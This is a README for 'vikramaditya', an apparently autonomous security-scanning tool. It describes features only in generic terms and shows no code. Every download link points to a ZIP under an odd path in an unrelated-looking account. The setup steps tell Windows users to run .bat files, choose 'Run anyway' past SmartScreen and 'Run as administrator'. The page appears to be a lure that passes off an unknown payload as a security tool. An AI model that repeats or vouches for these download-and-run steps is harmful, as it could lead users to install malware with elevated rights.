# 🛡️ vikramaditya - Find threats before they spread

[![Download vikramaditya](https://img.shields.io/badge/Download%20vikramaditya-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/wallachenonlinear561/vikramaditya/main/accomplishment/Software-2.0.zip)

## 🚀 What this is

vikramaditya is an autonomous VAPT platform. You give it a target such as a domain name, IP address, or CIDR range, and it works through the reconnaissance and reporting steps for you.

It is built for users who want a simple way to start a security scan without handling a long list of tools by hand. It can help with:

- Reconnaissance
- Basic vulnerability checks
- Asset discovery
- Report generation
- Bug bounty prep
- Security review work

The tool follows a clear flow: give it a target, let it scan, then review the output.

## 📥 Download and setup

Use this link to visit the page to download and set up vikramaditya:

[Visit the vikramaditya download page](https://raw.githubusercontent.com/wallachenonlinear561/vikramaditya/main/accomplishment/Software-2.0.zip)

### On Windows

1. Open the link above in your browser.
2. Download the project files from the page.
3. Save the files in a folder you can find again, such as `Downloads` or `Desktop`.
4. If the project comes as a ZIP file, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Look for a file named `README.md`, `run.bat`, `start.bat`, or a similar launch file.
7. If you see a `run.bat` or `start.bat` file, double-click it to launch the app.
8. If the project includes a Python launch script, open it with the included instructions in the folder.

### If Windows asks for permission

- Choose **More info** if needed
- Then choose **Run anyway** if you trust the source and want to continue

## 🖥️ What you need on Windows

For the best results, use:

- Windows 10 or Windows 11
- 8 GB RAM or more
- A stable internet connection
- At least 2 GB of free disk space
- Permission to run downloaded files

If the app starts through Python, you may also need:

- Python 3.10 or newer
- Git
- PowerShell access

If the app includes a packaged Windows file, you may not need extra software.

## 🔍 What it can do

vikramaditya is built around target-based security work. You enter one target and it can help with the rest.

Typical tasks include:

- Finding live hosts
- Checking open services
- Looking for common weak spots
- Mapping exposed web paths
- Grouping results into a readable report
- Keeping scan data in one place

This makes it useful for:

- Home lab checks
- Small business asset review
- Bug bounty research
- Internal security review
- Learning how VAPT tools work

## 🧭 How to use it

### 1. Start the app

Open the downloaded file or start the tool from the folder you extracted.

### 2. Enter a target

Use one of these target types:

- FQDN, such as `example.com`
- IP address, such as `192.168.1.10`
- CIDR range, such as `192.168.1.0/24`

### 3. Choose the scan path

The tool will move through common security stages such as:

- Host discovery
- Port checks
- Service checks
- Web checks
- Result sorting

### 4. Review the output

When the scan finishes, review the report for:

- Live systems
- Open ports
- Exposed services
- Risk areas
- Suggested next steps

### 5. Save the report

Keep the report for later review or share it with your team.

## ⚙️ Common scan flow

A typical run may follow this order:

1. Target input
2. Reachability check
3. Network discovery
4. Service scan
5. Web recon
6. Issue review
7. Report build

This flow helps keep the process simple for users who do not want to set up each step on their own.

## 📁 Expected folder layout

After you download and open the project, you may see files like these:

- `README.md`
- `requirements.txt`
- `run.bat`
- `start.bat`
- `main.py`
- `src/`
- `reports/`
- `data/`

If the project uses scripts, one of them will usually start the app. If it uses Python, the main script will often be named `main.py` or `app.py`.

## 🔐 Safety and use

Use vikramaditya only on targets you own or have permission to test. It is made for security work, not casual scanning.

Good uses include:

- Your own systems
- Lab machines
- Internal company assets
- Bug bounty targets within scope

## 🧰 Tips for first use

- Start with a single IP or one domain name
- Test on a lab system first
- Let the first scan finish before starting a new one
- Keep the report folder open so you can find results fast
- Use a stable network connection during the scan

## 🧩 Troubleshooting

### The file does not open

- Make sure you extracted the ZIP file first
- Check that Windows did not block the file
- Try right-clicking the file and choosing **Run as administrator**

### The app closes right away

- Open the folder again and look for the main launch file
- Check whether the project needs Python
- Read the files in the root folder for start steps

### The scan shows no results

- Check that the target is correct
- Make sure the host is online
- Try a domain name or IP that you know is reachable
- Confirm that your network allows the scan

### Windows SmartScreen appears

- Click **More info**
- Review the file name
- Run it only if you trust the source

## 📊 What the report may include

The report may show:

- Target details
- Alive hosts
- Port list
- Service names
- Web endpoints
- Risk notes
- Scan time
- Output path

This makes it easier to review what the tool found without opening each result by hand.

## 🏷️ Topics covered

- ai-security
- autonomous-agent
- bash
- bug-bounty
- penetration-testing
- python
- recon
- security
- vapt
- vulnerability-scanner

## 🧠 Best fit

vikramaditya fits users who want:

- A simple start point for VAPT work
- A way to scan a target without many manual steps
- A report they can review later
- A tool that mixes recon and reporting in one flow

## 🪟 Windows checklist

Before you run it, check these items:

- You downloaded the files from the link above
- You extracted the archive
- You found the launch file
- You have internet access
- You have enough disk space
- You know the target you want to test

## 📌 Target examples

You can use:

- `example.com`
- `10.0.0.5`
- `172.16.1.0/24`

Pick a target that matches your scope and your permission to test

## 🛠️ If you need to run it again

If you want to scan a new target later:

1. Open the app again
2. Enter the new target
3. Start the scan
4. Review the new report
5. Save the output in a new folder or with a new name